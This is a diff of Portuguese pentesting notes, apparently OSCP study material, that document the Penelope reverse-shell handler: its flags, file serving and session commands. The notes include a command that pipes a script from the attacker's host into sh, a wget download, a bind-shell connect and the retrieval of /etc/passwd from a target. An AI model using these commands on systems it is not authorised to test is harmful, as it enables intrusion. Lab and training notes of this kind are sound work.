@@ -152,9 +152,10 @@ chmod +s arquivo     # SUID bit — executa como DONO do arquivo (perigo!)
 
 ## 9. 🐚 Penelope — Reverse Shell Handler
 
-> **O que é:** Substituto avançado do `nc -lvnp`. Recebe reverse shells e faz upgrade automático para TTY interativa.
+> **O que é:** Substituto avançado do `nc -lvnp` (versão **0.19.1**). Recebe reverse shells e faz upgrade automático para TTY interativa.
 > **GitHub:** https://github.com/brightio/penelope
-> **Caminho:** `/home/gbmel/.local/bin/penelope`
+> **Caminho / Instalação:** `/home/gbmel/.local/bin/penelope` (`pipx install penelope-shell-handler`)
+> **Guia Completo:** [[Linux Privilege Escalation#🐚 Penelope — Reverse Shell Handler (Recomendado após PrivEsc)]]
 
 ### Iniciar o Listener
 ```bash
@@ -182,20 +183,21 @@ penelope -L              # Desabilita log de sessão
 penelope -S              # Aceita apenas 1 sessão (single session)
 penelope -C              # Não auto-attach em novas sessões
 penelope -U              # Desabilita upgrade automático da shell
-penelope -O              # Modo OSCP-safe (sem ferramentas extras)
+penelope --oscp-safe     # Modo OSCP-safe (desabilita exploração automática)
 penelope -m 3            # Manter 3 sessões por alvo
 ```
 
 ### Servidor HTTP (transferir arquivos para o alvo)
 ```bash
 # Servir arquivos da pasta atual na porta 8000
-penelope -s
+penelope -s ./
 
-# Servir em porta específica
-penelope -s -p 8080
+# Servir pasta específica em porta customizada
+penelope -s /opt/tools/ -p 8080
 
-# No alvo, baixar com:
-# wget http://SEU_IP:8000/linpeas.sh
+# No alvo, baixar ou executar direto na memória:
+# wget http://SEU_IP:8000/linpeas.sh -O /tmp/lp.sh
+# curl http://SEU_IP:8000/linpeas.sh | sh
 ```
 
 ### Bind Shell (conectar a uma porta aberta no alvo)
@@ -204,21 +206,21 @@ penelope -s -p 8080
 penelope -c ALVO_IP -p PORTA
 ```
 
-### Comandos Internos (dentro da Penelope)
+### Comandos Internos e Atalhos (dentro da Penelope)
 
-**Após receber uma shell, use estes comandos:**
+**Após receber uma shell, use estes atalhos e comandos:**
 
-| Comando | Função |
+| Comando / Tecla | Função |
 |---|---|
-| `Ctrl+C` | **Vai para o menu** (NÃO mata a sessão!) |
-| `Enter` | Volta para a sessão ativa |
+| `F12` | **Vai para o menu principal** em sessões com PTY (NÃO mata a sessão!) |
+| `Ctrl+D` / `Ctrl+C` | Vai para o menu em shells `readline` (`Ctrl+D`) ou `raw` sem upgrade (`Ctrl+C`) |
+| `interact 1` (ou `i 1`) | Entra / volta para a sessão nº 1 |
 | `sessions` | Lista todas as shells conectadas |
-| `use 1` | Troca para sessão nº 1 |
 | `download /etc/passwd` | Baixa arquivo do alvo → sua máquina |
-| `upload linpeas.sh /tmp/` | Envia arquivo sua máquina → alvo |
+| `upload linpeas.sh /tmp/` | Envia arquivo local (ou URL HTTP) → alvo |
 | `spawn` | Abre novo listener em outra porta |
 | `upgrade` | Força upgrade para PTY (geralmente automático) |
-| `dir` | Muda o diretório de downloads |
+| `dir` | Muda o diretório local da sessão |
 | `kill 1` | Encerra sessão nº 1 |
 | `exit` | Sai da Penelope |
 
